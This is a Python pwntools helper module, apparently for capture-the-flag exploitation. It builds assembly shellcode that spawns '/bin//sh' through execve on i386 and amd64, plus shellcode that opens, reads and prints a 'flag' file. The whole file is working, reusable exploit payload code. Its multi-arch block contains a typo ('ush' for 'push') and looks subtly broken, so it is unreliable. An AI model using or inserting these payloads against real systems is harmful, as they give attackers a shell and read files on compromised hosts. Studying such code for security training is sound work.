# -*- coding:utf-8 -*-
from pwn import *
def execve(is32=False,multi_arch=0):
    multi="""
xor esi, esi                  
mul esi                       
push rdx                        
push rdx                        
push rdx                        
push rsp                       
pop rbx                         
ush rbx                        
pop rdi                         
mov dword [rdi], 0x6e69622f     
mov dword [rdi+0x4], 0x68732f2f 
jnz 0x1f                        
mov al, 0x3b                  
syscall                         
xor ecx, ecx                   
mov al, 0xb                     
int 0x80      
"""
    if multi_arch:
        return asm(multi,arch="amd64")
    # 20byte         
    code32="""
xor    ecx,ecx
push   0xb
pop    eax
push   ecx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
"""
    shellcode_sh_i386=asm(code32,arch="i386")
    # 22byte
    code64="""
xor 	rsi,	rsi			
push rsi
mov 	rdi,	0x68732f2f6e69622f
push rdi
push rsp
pop rdi
mov al,0x3b
cdq
syscall
"""
    shellcode_sh_x64=asm(code64,arch="amd64")
    if is32:
        return shellcode_sh_i386
    else:
        return shellcode_sh_x64

def readflag(is32=False):
    # 可以将所有的mov指令转换为push pop减小shellcode大小
    if is32:
        code = """
xor ecx,ecx
mov eax,SYS_open
call here
.string "./flag"
.byte 0
here:
pop ebx
int 0x80
mov ebx,eax
mov ecx,esp
mov edx,0x100
mov eax,SYS_read
int 0x80
mov ebx,1
mov ecx,esp
mov edx,0x100
mov eax,SYS_write
int 0x80
mov eax,SYS_exit
int 0x80
"""
        # 65
        return asm(code,arch="i386")
    else:
        code = """
xor rsi,rsi
mov rax,SYS_open
call here
.string "/flag"
here:
pop rdi
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x100
mov rax,SYS_read
syscall
mov rdi,1
mov rsi,rsp
mov rdx,0x100
mov rax,SYS_write
syscall
mov rax,SYS_exit
syscall
"""
        return asm(code,arch="amd64")